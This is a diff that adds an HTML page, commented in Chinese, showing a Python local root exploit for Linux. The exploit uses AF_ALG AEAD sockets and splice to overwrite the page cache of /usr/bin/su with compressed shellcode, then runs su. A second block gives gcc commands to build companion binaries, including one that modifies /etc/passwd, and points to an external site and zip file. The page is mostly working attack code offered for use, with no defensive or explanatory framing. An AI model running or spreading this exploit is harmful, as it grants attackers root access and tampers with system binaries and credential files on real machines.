@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  .code-block {
+    background: #2d2d2d;
+    color: #ccc;
+    padding: 15px;
+    border-radius: 8px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    margin-bottom: 20px;   /* 两个框之间留间距 */
+  }
+  /* 模拟高亮颜色（保留，你可以按需使用） */
+  .tag { color: #e06c75; }
+  .attr { color: #d19a66; }
+  .value { color: #98c379; }
+  .comment { color: #5c6370; font-style: italic; }
+</style>
+</head>
+<body>
+
+
+<pre class="code-block"><code>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="value">"box"</span><span class="tag">&gt;</span>
+#!/usr/bin/env python3
+
+import os, socket, zlib
+
+# 常量定义
+AF_ALG = 38
+SOCK_SEQPACKET = 5
+SOL_ALG = 279
+TARGET_FILE = "/usr/bin/su" #/bin/su
+
+def bytes_from_hex(hex_str):
+    """十六进制字符串转字节"""
+    return bytes.fromhex(hex_str)
+
+def exploit_page_cache(target_fd, offset, data):
+    """
+    利用漏洞向目标文件的页缓存写入4字节数据
+    
+    Args:
+        target_fd: 目标文件描述符
+        offset: 写入偏移量
+        data: 4字节数据
+    """
+
+    # 创建AF_ALG socket
+    sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
+    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    
+    # 设置算法参数
+    sock.setsockopt(SOL_ALG, 1, bytes_from_hex("0800010000000010" + "00"*64))  # ALG_SET_KEY
+    sock.setsockopt(SOL_ALG, 5, None, 4)  # ALG_SET_AEAD_AUTHSIZE
+    
+    conn, _ = sock.accept()
+    
+    try:
+        # 构造消息
+        message = b"A"*4 + data[:4]
+        splice_len = offset + 4
+        
+        # 发送控制消息
+        ctrl_msgs = [
+            (SOL_ALG, 3, b'\x00'*4),           # ALG_SET_OP
+            (SOL_ALG, 2, b'\x10' + b'\x00'*19),  # ALG_SET_IV
+            (SOL_ALG, 4, b'\x08' + b'\x00'*3),   # ALG_SET_AEAD_ASSOCLEN
+        ]
+        conn.sendmsg([message], ctrl_msgs, socket.MSG_MORE)
+        
+        # 通过splice触发漏洞
+        pipe_read, pipe_write = os.pipe()
+        os.splice(target_fd, pipe_write, splice_len, offset_src=0)
+        os.splice(pipe_read, conn.fileno(), splice_len)
+        os.close(pipe_read)
+        os.close(pipe_write)
+        
+        # 触发解密操作
+        try:
+            conn.recv(8 + offset)
+        except (socket.error, BlockingIOError):
+            pass
+            
+    finally:
+        conn.close()
+        sock.close()
+
+def main():
+    """主函数"""
+    if os.geteuid() == 0:
+        print("rooted")
+        return
+    
+    # 打开目标文件
+    target_fd = os.open(TARGET_FILE, os.O_RDONLY)
+    
+    # 解压shellcode
+    compressed = bytes_from_hex(
+        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
+        "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
+        "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+    )
+    shellcode = zlib.decompress(compressed)
+    
+    # 注入shellcode
+    i = 0
+    while i < len(shellcode):
+        exploit_page_cache(target_fd, i, shellcode[i:i+4])
+        i += 4
+    
+    # 执行被修改的su程序
+    os.system("su")
+    os.close(target_fd)
+
+if __name__ == "__main__":
+    main()
+<span class="tag">&lt;/div&gt;</span>
+</code></pre>
+
+<!-- ====== 第二个框：与第一个完全相同，但不可编辑（去掉了 contenteditable） ====== -->
+<pre class="code-block"><code>
+# 编译漏洞检测工具
+gcc -std=gnu99 -o vulnerable vulnerable.c payload.c utils.c -lz
+
+# 编译标准利用程序
+gcc -std=gnu99 -o exploit exploit.c payload.c utils.c -lz
+
+# 编译 passwd 
+gcc -std=gnu99 -o exploit-passwd exploit-passwd.c payload.c utils.c -lz
+
+
+
+
+# 编译 vulnerable（检测工具）
+gcc -std=gnu99 -D_GNU_SOURCE \
+    -DALG_SET_AEAD_AUTHSIZE=5 \
+    -DALG_SET_AEAD_ASSOCLEN=4 \
+    -o vulnerable vulnerable.c payload.c utils.c -lz
+
+# 编译 exploit（标准利用）
+gcc -std=gnu99 -D_GNU_SOURCE \
+    -DALG_SET_AEAD_AUTHSIZE=5 \
+    -DALG_SET_AEAD_ASSOCLEN=4 \
+    -o exploit exploit.c payload.c utils.c -lz
+
+# 编译 exploit-passwd（修改 /etc/passwd）
+gcc -std=gnu99 -D_GNU_SOURCE \
+    -DALG_SET_AEAD_AUTHSIZE=5 \
+    -DALG_SET_AEAD_ASSOCLEN=4 \
+    -o exploit-passwd exploit-passwd.c payload.c utils.c -lz
+
+
+/////cf.zip
+/////https://www.linuxml.com/
+</code></pre>
+
+</body>
+</html>
